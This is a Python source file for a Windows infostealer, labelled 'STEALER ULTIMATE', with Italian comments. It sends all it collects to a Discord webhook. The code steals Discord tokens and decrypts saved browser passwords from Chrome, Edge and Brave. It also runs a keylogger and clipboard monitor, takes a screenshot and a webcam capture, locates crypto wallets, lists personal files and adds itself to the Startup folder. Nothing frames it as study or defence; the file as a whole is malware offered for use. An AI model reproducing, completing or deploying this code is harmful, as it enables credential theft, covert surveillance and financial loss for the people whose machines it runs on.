import os
import json  
import requests
import shutil
import sqlite3
import base64
import win32crypt
import psutil
import pyautogui
import platform
import subprocess
import tempfile
import time
import keyboard
import clipboard
import glob
from datetime import datetime
from Crypto.Cipher import AES
import threading

WEBHOOK = "https://discord.com/api/webhooks/1516557179958591658/RHo2_tp0AvLmXndWh3ofo06nEGbbz2gFvD2LdTh81bytuZShO1tnXOo_jt_vLpUxGJBV"  # ← SOSTITUISCI

def send(content, files=None):
    try:
        requests.post(WEBHOOK, json={"content": content}, files=files, timeout=10)
    except: pass

# ==================== SYSTEM + NETWORK ====================
def system_info():
    info = f"""
**🔥 STEALER ULTIMATE STARTED - {datetime.now()}**
PC: {platform.node()}
OS: {platform.system()} {platform.release()} {platform.version()}
CPU: {platform.processor()} | Cores: {psutil.cpu_count()}
RAM: {round(psutil.virtual_memory().total / (1024**3), 2)} GB
Public IP: {requests.get('https://api.ipify.org', timeout=5).text}
Local IPs: {', '.join([addr[4][0] for iface in psutil.net_if_addrs().values() for addr in iface if addr[0] == 2])}
    """
    send(info)

# ==================== DISCORD TOKENS + SESSIONS ====================
def steal_discord():
    paths = [
        os.getenv('APPDATA') + '\\discord\\Local Storage\\leveldb',
        os.getenv('APPDATA') + '\\discordcanary\\Local Storage\\leveldb',
        os.getenv('APPDATA') + '\\discordptb\\Local Storage\\leveldb',
        os.getenv('APPDATA') + '\\Lightcord\\Local Storage\\leveldb'
    ]
    tokens = []
    for path in paths:
        if os.path.exists(path):
            for file in glob.glob(f"{path}/*.log") + glob.glob(f"{path}/*.ldb"):
                try:
                    with open(file, 'r', errors='ignore') as f:
                        for line in f:
                            if "token" in line.lower():
                                try:
                                    token = line.split('"')[1]
                                    if token.startswith("mfa.") or len(token) > 50 and token not in tokens:
                                        tokens.append(token)
                                except: pass
                except: pass
    if tokens:
        send(f"**DISCORD TOKENS ({len(tokens)})**\n" + "\n".join([f"`{t}`" for t in tokens]))

# ==================== BROWSER PASSWORDS (Chrome + Edge + Brave) ====================
def steal_browser_passwords():
    browsers = {
        "Chrome": os.getenv('LOCALAPPDATA') + r"\Google\Chrome\User Data",
        "Edge": os.getenv('LOCALAPPDATA') + r"\Microsoft\Edge\User Data",
        "Brave": os.getenv('LOCALAPPDATA') + r"\BraveSoftware\Brave-Browser\User Data"
    }
    for name, base in browsers.items():
        try:
            login_db = base + r"\Default\Login Data"
            if os.path.exists(login_db):
                shutil.copy(login_db, "temp.db")
                conn = sqlite3.connect("temp.db")
                cursor = conn.cursor()
                cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                for row in cursor.fetchall():
                    url, user, pwd = row
                    try:
                        pwd = win32crypt.CryptUnprotectData(pwd, None, None, None, 0)[1].decode()
                        send(f"**{name} PASSWORD**\nURL: {url}\nUser: {user}\nPass: {pwd}")
                    except: pass
                os.remove("temp.db")
        except: pass

# ==================== CLIPBOARD + KEYLOGGER ====================
def keylogger():
    log = ""
    def on_press(e):
        nonlocal log
        log += str(e.name)
        if len(log) > 200:
            send(f"**KEYLOGGER**\n{log}")
            log = ""
    keyboard.on_press(on_press)
    time.sleep(60)  # logga per 60 secondi (puoi aumentare)

def clipboard_monitor():
    last = ""
    while True:
        try:
            current = clipboard.paste()
            if current != last and current.strip():
                send(f"**CLIPBOARD**\n{current}")
                last = current
        except: pass
        time.sleep(3)

# ==================== SCREENSHOT + WEBCAM ====================
def screenshot_and_webcam():
    try:
        pyautogui.screenshot("screen.png")
        with open("screen.png", "rb") as f:
            requests.post(WEBHOOK, files={"file": ("screen.png", f)})
        os.remove("screen.png")
    except: pass

    # Webcam (se presente)
    try:
        import cv2
        cap = cv2.VideoCapture(0)
        ret, frame = cap.read()
        if ret:
            cv2.imwrite("webcam.png", frame)
            with open("webcam.png", "rb") as f:
                requests.post(WEBHOOK, files={"file": ("webcam.png", f)})
            os.remove("webcam.png")
        cap.release()
    except: pass

# ==================== CRYPTO WALLETS + FILES ====================
def steal_wallets_and_files():
    wallet_paths = [
        os.path.expanduser("~/AppData/Roaming/Electrum/wallets"),
        os.path.expanduser("~/AppData/Roaming/MetaMask"),
        os.path.expanduser("~/AppData/Roaming/Exodus")
    ]
    for path in wallet_paths:
        if os.path.exists(path):
            send(f"**WALLET FOUND**: {path}")
            # Puoi zippare e mandare, ma per semplicità solo notifica

    # Documents + Desktop files
    for folder in [os.path.expanduser("~/Documents"), os.path.expanduser("~/Desktop"), os.path.expanduser("~/Downloads")]:
        try:
            files = [os.path.join(root, f) for root, _, files in os.walk(folder) for f in files[:30]]
            send(f"**FILES IN {folder}**\n" + "\n".join(files))
        except: pass

# ==================== PERSISTENZA ====================
def add_persistence():
    try:
        exe_path = os.path.abspath(__file__)
        startup = os.getenv('APPDATA') + r"\Microsoft\Windows\Start Menu\Programs\Startup\noxy.bat"
        with open(startup, "w") as f:
            f.write(f'start "" "{exe_path}"')
    except: pass

# ==================== MAIN ====================
def main():
    send("**🚀 ULTIMATE STEALER IN ESECUZIONE - DUMP TOTALE**")
    system_info()
    steal_discord()
    steal_browser_passwords()
    screenshot_and_webcam()
    steal_wallets_and_files()
    add_persistence()

    # Thread per keylogger e clipboard
    threading.Thread(target=keylogger, daemon=True).start()
    threading.Thread(target=clipboard_monitor, daemon=True).start()

    time.sleep(120)  # mantieni in esecuzione
    send("**DUMP COMPLETATO - TUTTO ESTRATTO DAL PC**")

if __name__ == "__main__":
    main()
